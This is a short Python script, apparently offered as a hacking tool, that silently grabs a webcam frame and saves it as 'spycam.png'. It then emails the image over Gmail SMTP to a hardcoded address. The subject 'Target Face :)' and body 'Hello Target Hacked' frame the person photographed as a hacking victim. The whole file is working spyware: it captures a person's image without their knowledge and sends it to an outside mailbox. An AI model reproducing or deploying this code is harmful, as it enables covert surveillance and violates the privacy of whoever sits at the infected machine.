import cv2
import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart

sender_email = 'example@email'
receiver_email = 'Example@gmail.com'
password = "****"

camera = cv2.VideoCapture(0)
ret, frame = camera.read()
if ret:
    cv2.imwrite("spycam.png", frame)
    camera.release()
else:
    exit()


# ارسال عکس به ایمیل
msg = MIMEMultipart()
msg['From'] = sender_email
msg['To'] = receiver_email
msg['Subject'] = "Target Face :)"

text = MIMEText("Hello Target Hacked ... :)")
msg.attach(text)

with open("spycam.png", 'rb') as img_file:
    image = MIMEImage(img_file.read())
    msg.attach(image)

try:
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, msg.as_string())
    server.quit()
    print(":)")
except Exception as e:
    print(f"error: {str(e)}")
